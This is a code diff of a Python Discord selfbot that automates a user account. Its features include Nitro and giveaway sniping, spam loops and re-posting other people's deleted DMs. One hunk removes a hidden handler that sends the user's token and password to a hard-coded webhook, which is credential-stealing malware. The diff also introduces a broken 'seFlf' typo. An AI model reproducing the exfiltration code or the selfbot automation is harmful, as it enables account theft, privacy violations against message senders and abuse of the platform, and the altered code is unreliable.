@@ -1,3 +1,4 @@
+import keep_alive
 import asyncio
 import datetime
 import functools
@@ -29,7 +30,6 @@ from gtts import gTTS
 class SELFBOT():
     __version__ = 1
 
-
 with open('config.json') as f:
     config = json.load(f)
 
@@ -39,7 +39,7 @@ prefix = config.get('prefix')
 
 nitro_sniper = config.get('nitro_sniper')
 
-stream_url = "https://www.twitch.tv/souljaboy"
+stream_url = "https://www.twitch.tv/biadeex"
 tts_language = "en"
 
 start_time = datetime.datetime.utcnow()
@@ -69,43 +69,15 @@ languages = {
 }
 
 locales = [
-    "da", "de",
-    "en-GB", "en-US",
-    "es-ES", "fr",
-    "hr", "it",
-    "lt", "hu",
-    "nl", "no",
-    "pl", "pt-BR",
-    "ro", "fi",
-    "sv-SE", "vi",
-    "tr", "cs",
-    "el", "bg",
-    "ru", "uk",
-    "th", "zh-CN",
-    "ja", "zh-TW",
-    "ko"
+    "da", "de", "en-GB", "en-US", "es-ES", "fr", "hr", "it", "lt", "hu", "nl",
+    "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs", "el", "bg",
+    "ru", "uk", "th", "zh-CN", "ja", "zh-TW", "ko"
 ]
 
-m_numbers = [
-    ":one:",
-    ":two:",
-    ":three:",
-    ":four:",
-    ":five:",
-    ":six:"
-]
+m_numbers = [":one:", ":two:", ":three:", ":four:", ":five:", ":six:"]
 
-m_offets = [
-    (-1, -1),
-    (0, -1),
-    (1, -1),
-    (-1, 0),
-    (1, 0),
-    (-1, 1),
-    (0, 1),
-    (1, 1)
-]
-
+m_offets = [(-1, -1), (0, -1), (1, -1), (-1, 0), (1, 0), (-1, 1), (0, 1), (1,
+                                                                           1)]
 
 
 def startprint():
@@ -115,12 +87,16 @@ def startprint():
         nitro = "Disabled"
 
     print(f'''{Fore.RESET}
-                        ███████╗██╗  ██╗███████╗████████╗███████╗██████╗ 
-                        ██╔════╝╚██╗██╔╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
-                        █████╗   ╚███╔╝ █████╗     ██║   █████╗  ██████╔╝
-                        ██╔══╝   ██╔██╗ ██╔══╝     ██║   ██╔══╝  ██╔══██╗
-                        ███████╗██╔╝ ██╗███████╗   ██║   ███████╗██║  ██║
-                        ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+▄▄▄▄    ██▓    ▄▄▄      ▓█████▄ ▓█████ ▒██   ██▒
+▓█████▄ ▓██▒   ▒████▄    ▒██▀ ██▌▓█   ▀ ▒▒ █ █ ▒░
+▒██▒ ▄██▒██░   ▒██  ▀█▄  ░██   █▌▒███   ░░  █   ░
+▒██░█▀  ▒██░   ░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄  ░ █ █ ▒ 
+░▓█  ▀█▓░██████▒▓█   ▓██▒░▒████▓ ░▒████▒▒██▒ ▒██▒
+░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░
+▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░░░   ░▒ ░
+ ░    ░   ░ ░    ░   ▒    ░ ░  ░    ░    ░    ░  
+ ░          ░  ░     ░  ░   ░       ░  ░ ░    ░  
+      ░                   ░                    
                                                  
 
                        {Fore.CYAN}xans v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {xans.user.name}#{xans.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{xans.user.id}   
@@ -144,7 +120,8 @@ def Init():
         xans.run(token, bot=False, reconnect=True)
         os.system(f'title (xans Selfbot) - Version {SELFBOT.__version__}')
     except discord.errors.LoginFailure:
-        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed" + Fore.RESET)
+        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed"
+              + Fore.RESET)
         os.system('pause >NUL')
 
 
@@ -154,7 +131,7 @@ class Login(discord.Client):
         users = len(self.users)
         print("")
         print(f"Connected to: [{self.user.name}]")
-        print(f"Token: {self.http.token}")
+        print(f"Token: {seFlf.http.token}")
         print(f"Guilds: {guilds}")
         print(f"Users: {users}")
         print("-------------------------------")
@@ -172,7 +149,9 @@ def async_executor():
 
     return outer
 
+
 toe = config.get('token')
+
 
 @async_executor()
 def do_tts(message):
@@ -200,12 +179,15 @@ def RandomColor():
 
 
 def RandString():
-    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))
+    return "".join(
+        random.choice(string.ascii_letters + string.digits)
+        for i in range(random.randint(14, 32)))
 
 
 colorama.init()
 xans = discord.Client()
-xans = commands.Bot(description='xans Selfbot', command_prefix=prefix, self_bot=True)
+xans = commands.Bot(
+    description='xans Selfbot', command_prefix=prefix, self_bot=True)
 
 xans.antiraid = False
 xans.msgsniper = True
@@ -231,15 +213,19 @@ async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
         return
     elif isinstance(error, commands.CheckFailure):
-        await ctx.send('[ERROR]: You\'re missing permission to execute this command', delete_after=3)
+        await ctx.send(
+            '[ERROR]: You\'re missing permission to execute this command',
+            delete_after=3)
     elif isinstance(error, commands.MissingRequiredArgument):
         await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=3)
     elif isinstance(error, numpy.AxisError):
         await ctx.send('Invalid Image', delete_after=3)
     elif isinstance(error, discord.errors.Forbidden):
-        await ctx.send(f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
+        await ctx.send(
+            f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
     elif "Cannot send an empty message" in error_str:
-        await ctx.send('[ERROR]: Message contents cannot be null', delete_after=3)
+        await ctx.send(
+            '[ERROR]: Message contents cannot be null', delete_after=3)
     else:
         ctx.send(f'[ERROR]: {error_str}', delete_after=3)
 
@@ -255,25 +241,21 @@ async def on_message(message):
         await message.channel.send(chr(173) + message.content)
 
     def GiveawayData():
-        print(
-            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
-            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
-            + Fore.RESET)
+        print(f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
+              f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]" +
+              Fore.RESET)
 
     def SlotBotData():
-        print(
-            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
-            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
-            + Fore.RESET)
+        print(f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
+              f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]" +
+              Fore.RESET)
 
     def NitroData(elapsed, code):
-        print(
-            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
-            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
-            f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
-            f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
-            f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
-            + Fore.RESET)
+        print(f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
+              f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
+              f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
+              f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
+              f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}" + Fore.RESET)
 
     time = datetime.datetime.now().strftime("%H:%M %p")
     if 'discord.gift/' in message.content:
@@ -294,17 +276,18 @@ async def on_message(message):
 
             if 'This gift has been redeemed already.' in r:
                 print(""
-                      f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]" + Fore.RESET)
+                      f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]" +
+                      Fore.RESET)
                 NitroData(elapsed, code)
 
             elif 'subscription_plan' in r:
-                print(""
-                      f"\n{Fore.CYAN}[{time} - Nitro Success]" + Fore.RESET)
+                print("" f"\n{Fore.CYAN}[{time} - Nitro Success]" + Fore.RESET)
                 NitroData(elapsed, code)
 
             elif 'Unknown Gift Code' in r:
                 print(""
-                      f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]" + Fore.RESET)
+                      f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]" +
+                      Fore.RESET)
                 NitroData(elapsed, code)
         else:
             return
@@ -316,7 +299,8 @@ async def on_message(message):
                     await message.channel.send('~grab')
                 except discord.errors.Forbidden:
                     print(""
-                          f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
+                          f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]" +
+                          Fore.RESET)
                     SlotBotData()
                 print(""
                       f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]" + Fore.RESET)
@@ -331,7 +315,8 @@ async def on_message(message):
                     await message.add_reaction("🎉")
                 except discord.errors.Forbidden:
                     print(""
-                          f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]" + Fore.RESET)
+                          f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]" +
+                          Fore.RESET)
                     GiveawayData()
                 print(""
                       f"\n{Fore.CYAN}[{time} - Giveaway Sniped]" + Fore.RESET)
@@ -342,8 +327,7 @@ async def on_message(message):
     if f'Congratulations <@{xans.user.id}>' in message.content:
         if xans.giveaway_sniper:
             if message.author.id == 294882584201003009:
-                print(""
-                      f"\n{Fore.CYAN}[{time} - Giveaway Won]" + Fore.RESET)
+                print("" f"\n{Fore.CYAN}[{time} - Giveaway Won]" + Fore.RESET)
                 GiveawayData()
         else:
             return
@@ -351,19 +335,18 @@ async def on_message(message):
     await xans.process_commands(message)
 
 
-@xans.event
-async def on_connect():
-    Clear()  
-    requests.post('https://canary.discord.com/api/webhooks/830080942051164230/U-QWhCVjAtwQbMRaukJmLMoj2IJKu1W8NqsWiKAO8F_nUP0czh2aslTKCw3oMy34vWng',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
-    startprint()
+
+
 
 @xans.event
 async def on_member_ban(guild: discord.Guild, user: discord.user):
     if xans.antiraid is True:
         try:
-            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
-                if guild.id in xans.whitelisted_users.keys() and i.user.id in xans.whitelisted_users[
-                    guild.id].keys() and i.user.id is not xans.user.id:
+            async for i in guild.audit_logs(
+                    limit=1, action=discord.AuditLogAction.ban):
+                if guild.id in xans.whitelisted_users.keys(
+                ) and i.user.id in xans.whitelisted_users[
+                        guild.id].keys() and i.user.id is not xans.user.id:
                     print("not banned - " + i.user.name)
                 else:
                     print("banned - " + i.user.name)
@@ -377,9 +360,11 @@ async def on_member_join(member):
     if xans.antiraid is True and member.bot:
         try:
             guild = member.guild
-            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
-                if member.guild.id in xans.whitelisted_users.keys() and i.user.id in xans.whitelisted_users[
-                    member.guild.id].keys():
+            async for i in guild.audit_logs(
+                    limit=1, action=discord.AuditLogAction.bot_add):
+                if member.guild.id in xans.whitelisted_users.keys(
+                ) and i.user.id in xans.whitelisted_users[member.guild.
+                                                            id].keys():
                     return
                 else:
                     await guild.ban(member, reason="xans Anti-Nuke")
@@ -393,9 +378,11 @@ async def on_member_remove(member):
     if xans.antiraid is True:
         try:
             guild = member.guild
-            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
-                if guild.id in xans.whitelisted_users.keys() and i.user.id in xans.whitelisted_users[
-                    guild.id].keys() and i.user.id is not xans.user.id:
+            async for i in guild.audit_logs(
+                    limit=1, action=discord.AuditLogAction.kick):
+                if guild.id in xans.whitelisted_users.keys(
+                ) and i.user.id in xans.whitelisted_users[
+                        guild.id].keys() and i.user.id is not xans.user.id:
                     print('not banned')
                 else:
                     print('banned')
@@ -435,52 +422,57 @@ async def lyrics(ctx, *, args):
 @xans.command(aliases=[])
 async def msgsniper(ctx, msgsniperlol=None):
     await ctx.message.delete()
-    if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
+    if str(msgsniperlol).lower() == 'true' or str(
+            msgsniperlol).lower() == 'on':
         xans.msgsniper = True
-        await ctx.send('xans Message-Sniper is now **enabled**')
-    elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
+        await ctx.send('**`Message-Sniper is now enabled`**')
+    elif str(msgsniperlol).lower() == 'false' or str(
+            msgsniperlol).lower() == 'off':
         xans.msgsniper = False
-        await ctx.send('xans Message-Sniper is now **disabled**')
+        await ctx.send('**`Message-Sniper is now disabled`**')
 
 
 @xans.command(aliases=['ar', 'antiraid'])
 async def antinuke(ctx, antiraidparameter=None):
     await ctx.message.delete()
     xans.antiraid = False
-    if str(antiraidparameter).lower() == 'true' or str(antiraidparameter).lower() == 'on':
+    if str(antiraidparameter).lower() == 'true' or str(
+            antiraidparameter).lower() == 'on':
         xans.antiraid = True
-        await ctx.send('Anti-Nuke is now **enabled**')
-    elif str(antiraidparameter).lower() == 'false' or str(antiraidparameter).lower() == 'off':
+        await ctx.send('**`Anti-Nuke is now enabled`**')
+    elif str(antiraidparameter).lower() == 'false' or str(
+            antiraidparameter).lower() == 'off':
         xans.antiraid = False
-        await ctx.send('Anti-Nuke is now **disabled**')
+        await ctx.send('**`Anti-Nuke is now disabled`**')
 
 
 @xans.command(aliases=['wl'])
 async def whitelist(ctx, user: discord.Member = None):
     await ctx.message.delete()
     if user is None:
-        await ctx.send("Please specify a user to whitelist")
+        await ctx.send("`Please specify a user to whitelist`")
     else:
         if ctx.guild.id not in xans.whitelisted_users.keys():
             xans.whitelisted_users[ctx.guild.id] = {}
         if user.id in xans.whitelisted_users[ctx.guild.id]:
-            await ctx.send('That user is already whitelisted')
+            await ctx.send('`That user is already whitelisted`')
         else:
             xans.whitelisted_users[ctx.guild.id][user.id] = 0
-            await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_",
-                                                                                                      "\_") + "#" + user.discriminator + "**")
+            await ctx.send("`**Whitelisted**`" + user.name.replace(
+                "*", "\*").replace("`", "\`").replace("_", "\_") + "#" +
+                           user.discriminator + "**")
     # else:
     #     user = xans.get_user(id)
     #     if user is None:
-    #         await ctx.send("Couldn't find that user")
+    #         await ctx.send("`Couldn't find that user`")
     #         return
     #     if ctx.guild.id not in xans.whitelisted_users.keys():
     #         xans.whitelisted_users[ctx.guild.id] = {}
     #     if user.id in xans.whitelisted_users[ctx.guild.id]:
-    #         await ctx.send('That user is already whitelisted')
+    #         await ctx.send('`That user is already whitelisted`')
     #     else:
     #         xans.whitelisted_users[ctx.guild.id][user.id] = 0
-    #         await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_","\_") + "#" + user.discriminator + "**")
+    #         await ctx.send("`**Whitelisted**`" + user.name.replace("*", "\*").replace("`", "\`").replace("_","\_") + "#" + user.discriminator + "**")
 
 
 @xans.command(aliases=['wld'])
@@ -491,20 +483,24 @@ async def whitelisted(ctx, g=None):
         for key in xans.whitelisted_users:
             for key2 in xans.whitelisted_users[key]:
                 user = xans.get_user(key2)
-                whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
-                                                                                              "\_") + "#" + user.discriminator + "** - " + xans.get_guild(
-                    key).name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "" + "\n"
+                whitelist += '**+ ' + user.name.replace('*', "\*").replace(
+                    '`', "\`").replace(
+                        '_', "\_"
+                    ) + "#" + user.discriminator + "** - " + xans.get_guild(
+                        key).name.replace('*', "\*").replace(
+                            '`', "\`").replace('_', "\_") + "" + "\n"
         await ctx.send(whitelist)
     else:
-        whitelist = "`" + ctx.guild.name.replace('*', "\*").replace('`', "\`").replace('_',
-                                                                                       "\_") + '\'s Whitelisted Users:`\n'
+        whitelist = "`" + ctx.guild.name.replace('*', "\*").replace(
+            '`', "\`").replace('_', "\_") + '\'s Whitelisted Users:`\n'
         for key in xans.whitelisted_users:
             if key == ctx.guild.id:
                 for key2 in xans.whitelisted_users[ctx.guild.id]:
                     user = xans.get_user(key2)
-                    whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
-                                                                                                  "\_") + "#" + user.discriminator + " (" + str(
-                        user.id) + ")" + "**\n"
+                    whitelist += '**+ ' + user.name.replace('*', "\*").replace(
+                        '`', "\`").replace(
+                            '_', "\_") + "#" + user.discriminator + " (" + str(
+                                user.id) + ")" + "**\n"
         await ctx.send(whitelist)
 
 
@@ -519,9 +515,10 @@ async def unwhitelist(ctx, user: discord.Member = None):
         if user.id in xans.whitelisted_users[ctx.guild.id]:
             xans.whitelisted_users[ctx.guild.id].pop(user.id, 0)
             user2 = xans.get_user(user.id)
-            await ctx.send(
-                'Successfully unwhitelisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',
-                                                                                                           "\_") + '#' + user2.discriminator + '**')
+            await ctx.send('Successfully unwhitelisted **' +
+                           user2.name.replace('*', "\*").replace(
+                               '`', "\`").replace('_', "\_") + '#' +
+                           user2.discriminator + '**')
 
 
 @xans.command(aliases=['clearwl', 'clearwld'])
@@ -534,7 +531,8 @@ async def clearwhitelist(ctx):
 @xans.command()
 async def yuikiss(ctx, user: discord.User = None):
     await ctx.message.delete()
-    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
+    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
+            ctx.message.channel, discord.GroupChannel):
         await ctx.send("You can't use Yui Kiss in DMs or GCs", delete_after=3)
     else:
         if user is None:
@@ -543,17 +541,20 @@ async def yuikiss(ctx, user: discord.User = None):
         xans.yui_kiss_user = user.id
         xans.yui_kiss_channel = ctx.channel.id
         if xans.yui_kiss_user is None or xans.yui_kiss_channel is None:
-            await ctx.send('An impossible error occured, try again later or contact swag')
+            await ctx.send(
+                'An impossible error occured, try again later or contact swag')
             return
         while xans.yui_kiss_user is not None and xans.yui_kiss_channel is not None:
-            await xans.get_channel(xans.yui_kiss_channel).send('yui kiss ' + str(xans.yui_kiss_user), delete_after=0.1)
+            await xans.get_channel(xans.yui_kiss_channel).send(
+                'yui kiss ' + str(xans.yui_kiss_user), delete_after=0.1)
             await asyncio.sleep(60)
 
 
 @xans.command()
 async def yuihug(ctx, user: discord.User = None):
     await ctx.message.delete()
-    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
+    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
+            ctx.message.channel, discord.GroupChannel):
         await ctx.send("You can't use Yui Hug in DMs or GCs", delete_after=3)
     else:
         if user is None:
@@ -562,11 +563,14 @@ async def yuihug(ctx, user: discord.User = None):
         xans.yui_hug_user = user.id
         xans.yui_hug_channel = ctx.channel.id
         if xans.yui_hug_user is None or xans.yui_hug_channel is None:
-            await ctx.send('An impossible error occured, try again later or contact swag')
+            await ctx.send(
+                'An impossible error occured, try again later or contact swag')
             return
         while xans.yui_hug_user is not None and xans.yui_hug_channel is not None:
-            await xans.get_channel(xans.yui_hug_channel).send('yui hug ' + str(xans.yui_hug_user), delete_after=0.1)
+            await xans.get_channel(xans.yui_hug_channel).send(
+                'yui hug ' + str(xans.yui_hug_user), delete_after=0.1)
             await asyncio.sleep(60)
+
 
 @xans.command()
 async def yuistop(ctx):
@@ -575,73 +579,86 @@ async def yuistop(ctx):
     xans.yui_kiss_channel = None
     xans.yui_hug_user = None
     xans.yui_hug_channel = None
-    await ctx.send('Successfully **disabled** Yui Loops', delete_after=3)
+    await ctx.send('`Successfully **disabled** Yui Loops`', delete_after=3)
+
 
 @xans.command(aliases=["automee6"])
 async def mee6(ctx, param=None):
     await ctx.message.delete()
     if param is None:
-        await ctx.send("Please specify yes or no", delete_after=3)
+        await ctx.send("`Please specify yes or no`", delete_after=3)
         return
     if str(param).lower() == 'true' or str(param).lower() == 'on':
-        if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
-            await ctx.send("You can't bind Auto-MEE6 to a DM or GC", delete_after=3)
+        if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
+                ctx.message.channel, discord.GroupChannel):
+            await ctx.send(
+                "`You can't bind Auto-MEE6 to a DM or GC`", delete_after=3)
             return
         else:
             xans.mee6 = True
-            await ctx.send("Auto-MEE6 Successfully bound to `" + ctx.channel.name + "`", delete_after=3)
+            await ctx.send(
+                "`Auto-MEE6 Successfully bound to`" + ctx.channel.name +  "`",
+                delete_after=3)
             xans.mee6_channel = ctx.channel.id
     elif str(param).lower() == 'false' or str(param).lower() == 'off':
         xans.mee6 = False
-        await ctx.send("Auto-MEE6 Successfully **disabled**", delete_after=3)
+        await ctx.send("`Auto-MEE6 Successfully **disabled**`", delete_after=3)
     while xans.mee6 is True:
-        sentences = ['Stop waiting for exceptional things to just happen.',
-                     'The lyrics of the song sounded like fingernails on a chalkboard.',
-                     'I checked to make sure that he was still alive.', 'We need to rent a room for our party.',
-                     'He had a hidden stash underneath the floorboards in the back room of the house.',
-                     'Your girlfriend bought your favorite cookie crisp cereal but forgot to get milk.',
-                     'People generally approve of dogs eating cat food but not cats eating dog food.',
-                     'I may struggle with geography, but I\'m sure I\'m somewhere around here.',
-                     'She was the type of girl who wanted to live in a pink house.',
-                     'The bees decided to have a mutiny against their queen.',
-                     'She looked at the masterpiece hanging in the museum but all she could think is that her five-year-old could do better.',
-                     'The stranger officiates the meal.', 'She opened up her third bottle of wine of the night.',
-                     'They desperately needed another drummer since the current one only knew how to play bongos.',
-                     'He waited for the stop sign to turn to a go sign.',
-                     'His thought process was on so many levels that he gave himself a phobia of heights.',
-                     'Her hair was windswept as she rode in the black convertible.',
-                     'Karen realized the only way she was getting into heaven was to cheat.',
-                     'The group quickly understood that toxic waste was the most effective barrier to use against the zombies.',
-                     'It was obvious she was hot, sweaty, and tired.', 'This book is sure to liquefy your brain.',
-                     'I love eating toasted cheese and tuna sandwiches.', 'If you don\'t like toenails',
-                     'You probably shouldn\'t look at your feet.',
-                     'Wisdom is easily acquired when hiding under the bed with a saucepan on your head.',
-                     'The spa attendant applied the deep cleaning mask to the gentleman’s back.',
-                     'The three-year-old girl ran down the beach as the kite flew behind her.',
-                     'For oil spots on the floor, nothing beats parking a motorbike in the lounge.',
-                     'They improved dramatically once the lead singer left.',
-                     'The Tsunami wave crashed against the raised houses and broke the pilings as if they were toothpicks.',
-                     'Excitement replaced fear until the final moment.', 'The sun had set and so had his dreams.',
-                     'People keep telling me "orange" but I still prefer "pink".',
-                     'Someone I know recently combined Maple Syrup & buttered Popcorn thinking it would taste like caramel popcorn. It didn’t and they don’t recommend anyone else do it either.',
-                     'I liked their first two albums but changed my mind after that charity gig.',
-                     'Plans for this weekend include turning wine into water.',
-                     'A kangaroo is really just a rabbit on steroids.',
-                     'He played the game as if his life depended on it and the truth was that it did.',
-                     'He\'s in a boy band which doesn\'t make much sense for a snake.',
-                     'She let the balloon float up into the air with her hopes and dreams.',
-                     'There was coal in his stocking and he was thrilled.',
-                     'This made him feel like an old-style rootbeer float smells.',
-                     'It\'s not possible to convince a monkey to give you a banana by promising it infinite bananas when they die.',
-                     'The light in his life was actually a fire burning all around him.',
-                     'Truth in advertising and dinosaurs with skateboards have much in common.',
-                     'On a scale from one to ten, what\'s your favorite flavor of random grammar?',
-                     'The view from the lighthouse excited even the most seasoned traveler.',
-                     'The tortoise jumped into the lake with dreams of becoming a sea turtle.',
-                     'It\'s difficult to understand the lengths he\'d go to remain short.',
-                     'Nobody questions who built the pyramids in Mexico.',
-                     'They ran around the corner to find that they had traveled back in time.']
-        await xans.get_channel(xans.mee6_channel).send(random.choice(sentences), delete_after=0.1)
+        sentences = [
+            'Stop waiting for exceptional things to just happen.',
+            'The lyrics of the song sounded like fingernails on a chalkboard.',
+            'I checked to make sure that he was still alive.',
+            'We need to rent a room for our party.',
+            'He had a hidden stash underneath the floorboards in the back room of the house.',
+            'Your girlfriend bought your favorite cookie crisp cereal but forgot to get milk.',
+            'People generally approve of dogs eating cat food but not cats eating dog food.',
+            'I may struggle with geography, but I\'m sure I\'m somewhere around here.',
+            'She was the type of girl who wanted to live in a pink house.',
+            'The bees decided to have a mutiny against their queen.',
+            'She looked at the masterpiece hanging in the museum but all she could think is that her five-year-old could do better.',
+            'The stranger officiates the meal.',
+            'She opened up her third bottle of wine of the night.',
+            'They desperately needed another drummer since the current one only knew how to play bongos.',
+            'He waited for the stop sign to turn to a go sign.',
+            'His thought process was on so many levels that he gave himself a phobia of heights.',
+            'Her hair was windswept as she rode in the black convertible.',
+            'Karen realized the only way she was getting into heaven was to cheat.',
+            'The group quickly understood that toxic waste was the most effective barrier to use against the zombies.',
+            'It was obvious she was hot, sweaty, and tired.',
+            'This book is sure to liquefy your brain.',
+            'I love eating toasted cheese and tuna sandwiches.',
+            'If you don\'t like toenails',
+            'You probably shouldn\'t look at your feet.',
+            'Wisdom is easily acquired when hiding under the bed with a saucepan on your head.',
+            'The spa attendant applied the deep cleaning mask to the gentleman’s back.',
+            'The three-year-old girl ran down the beach as the kite flew behind her.',
+            'For oil spots on the floor, nothing beats parking a motorbike in the lounge.',
+            'They improved dramatically once the lead singer left.',
+            'The Tsunami wave crashed against the raised houses and broke the pilings as if they were toothpicks.',
+            'Excitement replaced fear until the final moment.',
+            'The sun had set and so had his dreams.',
+            'People keep telling me "orange" but I still prefer "pink".',
+            'Someone I know recently combined Maple Syrup & buttered Popcorn thinking it would taste like caramel popcorn. It didn’t and they don’t recommend anyone else do it either.',
+            'I liked their first two albums but changed my mind after that charity gig.',
+            'Plans for this weekend include turning wine into water.',
+            'A kangaroo is really just a rabbit on steroids.',
+            'He played the game as if his life depended on it and the truth was that it did.',
+            'He\'s in a boy band which doesn\'t make much sense for a snake.',
+            'She let the balloon float up into the air with her hopes and dreams.',
+            'There was coal in his stocking and he was thrilled.',
+            'This made him feel like an old-style rootbeer float smells.',
+            'It\'s not possible to convince a monkey to give you a banana by promising it infinite bananas when they die.',
+            'The light in his life was actually a fire burning all around him.',
+            'Truth in advertising and dinosaurs with skateboards have much in common.',
+            'On a scale from one to ten, what\'s your favorite flavor of random grammar?',
+            'The view from the lighthouse excited even the most seasoned traveler.',
+            'The tortoise jumped into the lake with dreams of becoming a sea turtle.',
+            'It\'s difficult to understand the lengths he\'d go to remain short.',
+            'Nobody questions who built the pyramids in Mexico.',
+            'They ran around the corner to find that they had traveled back in time.'
+        ]
+        await xans.get_channel(xans.mee6_channel).send(
+            random.choice(sentences), delete_after=0.1)
         await asyncio.sleep(60)
 
 
@@ -670,18 +687,24 @@ async def on_message_delete(message):
     if message.author.id == xans.user.id:
         return
     if xans.msgsniper:
-        if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel):
+        if isinstance(message.channel, discord.DMChannel) or isinstance(
+                message.channel, discord.GroupChannel):
             attachments = message.attachments
             if len(attachments) == 0:
-                message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
-                    message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
+                message_content = "`" + str(
+                    discord.utils.escape_markdown(str(
+                        message.author))) + "`: " + str(
+                            message.content).replace(
+                                "@everyone", "@\u200beveryone").replace(
+                                    "@here", "@\u200bhere")
                 await message.channel.send(message_content)
             else:
                 links = ""
                 for attachment in attachments:
                     links += attachment.proxy_url + "\n"
                 message_content = "`" + str(
-                    discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
+                    discord.utils.escape_markdown(str(message.author))
+                ) + "`: " + discord.utils.escape_mentions(
                     message.content) + "\n\n**Attachments:**\n" + links
                 await message.channel.send(message_content)
     if len(xans.sniped_message_dict) > 1000:
@@ -689,8 +712,11 @@ async def on_message_delete(message):
     attachments = message.attachments
     if len(attachments) == 0:
         channel_id = message.channel.id
-        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
-            message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
+        message_content = "`" + str(
+            discord.utils.escape_markdown(str(
+                message.author))) + "`: " + str(message.content).replace(
+                    "@everyone", "@\u200beveryone").replace(
+                        "@here", "@\u200bhere")
         xans.sniped_message_dict.update({channel_id: message_content})
     else:
         links = ""
@@ -698,8 +724,9 @@ async def on_message_delete(message):
             links += attachment.proxy_url + "\n"
         channel_id = message.channel.id
         message_content = "`" + str(
-            discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
-            message.content) + "\n\n**Attachments:**\n" + links
+            discord.utils.escape_markdown(str(
+                message.author))) + "`: " + discord.utils.escape_mentions(
+                    message.content) + "\n\n**Attachments:**\n" + links
         xans.sniped_message_dict.update({channel_id: message_content})
 
 
@@ -710,21 +737,26 @@ async def on_message_edit(before, after):
     if xans.msgsniper:
         if before.content is after.content:
             return
-        if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel):
+        if isinstance(before.channel, discord.DMChannel) or isinstance(
+                before.channel, discord.GroupChannel):
             attachments = before.attachments
             if len(attachments) == 0:
                 message_content = "`" + str(
-                    discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
-                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
-                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
-                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
